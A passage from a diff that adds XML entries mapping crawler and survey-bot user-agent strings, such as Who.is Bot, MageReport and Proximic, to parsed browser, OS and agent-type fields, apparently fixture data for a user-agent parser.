+            <field name="scripted_agent_type">Survey</field>
+            <field name="string">
+                BrowserShots
+            </field>
+        </string>
+        <string>
+            <field name="browser">unknown</field>
+            <field name="version">unknown</field>
+            <field name="os">unknown</field>
+            <field name="os_version">unknown</field>
+            <field name="device">unknown</field>
+            <field name="device_version">unknown</field>
+            <field name="scripted_agent">Who.is</field>
+            <field name="scripted_agent_type">Spider</field>
+            <field name="string">
+                Who.is Bot
+            </field>
+        </string>
+        <string>
+            <field name="browser">Mozilla</field>
+            <field name="version">5.0</field>
+            <field name="os">unknown</field>
+            <field name="os_version">unknown</field>
+            <field name="device">unknown</field>
+            <field name="device_version">unknown</field>
+            <field name="scripted_agent">MageReport</field>
+            <field name="scripted_agent_type">Survey</field>
+            <field name="string">
+                Mozilla/5.0 (www.magereport.com/page/about)
+            </field>
+        </string>
+        <string>
+            <field name="browser">Mozilla</field>
+            <field name="version">5.0</field>
+            <field name="os">unknown</field>
+            <field name="os_version">unknown</field>
+            <field name="device">unknown</field>
+            <field name="device_version">unknown</field>
+            <field name="scripted_agent">Ubermetrics Technologies</field>
+            <field name="scripted_agent_type">Survey</field>
+            <field name="string">
+                Mozilla/5.0 (compatible; um-LN/1.0; mailto: techinfo@ubermetrics-technologies.com)
+            </field>
+        </string>
+        <string>
+            <field name="browser">Mozilla</field>
+            <field name="version">5.0</field>
+            <field name="os">unknown</field>
+            <field name="os_version">unknown</field>
+            <field name="device">unknown</field>
+            <field name="device_version">unknown</field>
+            <field name="scripted_agent">Proximic</field>
+            <field name="scripted_agent_type">Spider</field>
+            <field name="string">
+                Mozilla/5.0 (compatible; proximic; +http://www.proximic.com/info/spider.php)
             </field>
         </string>
     </strings>
